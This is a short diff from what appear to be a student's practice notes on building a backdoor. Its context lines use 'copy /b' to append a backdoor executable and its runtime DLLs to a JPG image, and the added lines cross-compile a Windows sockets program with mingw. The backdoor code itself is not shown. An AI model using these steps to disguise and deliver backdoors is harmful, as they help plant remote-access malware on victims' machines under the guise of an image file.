@@ -235,6 +235,11 @@ type nul > payload.bat
 copy /b "bu.jpg"+"Back_Door_Self_Practice.exe"+"libgcc_s_seh-1.dll"+"libstdc++-6.dll"+"libwinpthread-1.dll" test.jpg
 copy /b bu.jpg+Back_Door_Self_Practice.exe test.jpg
 
+///compile the .cpp file in linux:
+x86_64-w64-mingw32-g++ 18CSE048.cpp -o 18CSE048.exe -lws2_32 -static-libgcc -static-libstdc++
+
+
+
 
 
 
